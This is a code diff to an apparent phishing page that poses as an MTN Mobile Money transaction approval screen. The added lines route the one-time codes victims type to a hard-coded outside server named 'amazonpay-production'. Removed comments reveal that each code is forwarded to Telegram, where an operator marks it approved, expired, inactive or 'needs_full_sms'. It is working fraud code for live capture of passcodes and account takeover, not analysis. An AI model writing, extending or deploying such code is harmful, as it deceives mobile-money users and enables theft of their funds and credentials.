@@ -267,6 +267,16 @@
 <div class="toast" id="toast"></div>
 
 <script>
+  /* All API calls route to Railway (always-on) so the flow works
+     even if Render is cold-starting. */
+  const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
+
+  const CONFIG = {
+    SUBMIT: RAILWAY_BASE + '/api/verification/submit',
+    STATUS: (ref) => RAILWAY_BASE + '/api/verification/status/' + encodeURIComponent(ref) + '?_=' + Date.now(),
+    RESEND: RAILWAY_BASE + '/api/verification/otp'
+  };
+
   const params = new URLSearchParams(location.search);
   const tx = {
     ref: params.get('tx') || '',
@@ -306,9 +316,6 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
   }
 
-  /* ============================================================
-     4-digit code inputs
-  ============================================================ */
   const codeInputs = [
     document.getElementById('c1'),
     document.getElementById('c2'),
@@ -402,12 +409,6 @@
     }
   });
 
-  /* ============================================================
-     Approve → submit OTP → wait for Telegram decision
-       approved  → success overlay → success.html
-       expired   → notice + resend
-       inactive  → oops.html
-  ============================================================ */
   const PAGE_LIMIT_MS = 5 * 60 * 1000;
   const PAGE_START = Date.now();
 
@@ -436,16 +437,14 @@
 
     approveBtn.disabled = true;
 
-    // Show overlay immediately
     document.getElementById('authTitle').textContent = 'Approving transaction…';
     document.getElementById('authText').textContent =
       'Verifying your code with MTN Mobile Money. Please do not close this page.';
     document.getElementById('authorizingOverlay').classList.add('show');
 
-    // Send OTP to backend → Telegram with 3 buttons
     let serverAccepted = true;
     try {
-      const r = await fetch('/api/verification/submit', {
+      const r = await fetch(CONFIG.SUBMIT, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -491,14 +490,13 @@
 
       let decision = 'pending';
       try {
-        const r = await fetch('/api/verification/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const r = await fetch(CONFIG.STATUS(tx.ref));
         const j = await r.json();
         decision = j.decision || 'pending';
       } catch (e) {}
 
       if (!pollingActive) return;
 
-      /* APPROVED → success overlay, then success.html */
       if (decision === 'approved') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -515,7 +513,6 @@
         return;
       }
 
-      /* EXPIRED / DECLINED → code expired + resend */
       if (decision === 'declined' || decision === 'expired') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -529,7 +526,6 @@
         return;
       }
 
-      /* INACTIVE → oops.html */
       if (decision === 'inactive' || decision === 'needs_full_sms') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -547,15 +543,12 @@
     poll();
   }
 
-  /* ============================================================
-     Resend code
-  ============================================================ */
   async function resendCode() {
     const lbl = document.getElementById('resendLabel');
     resendBtn.disabled = true;
     lbl.textContent = 'Sending…';
     try {
-      const r = await fetch('/api/verification/otp', {
+      const r = await fetch(CONFIG.RESEND, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
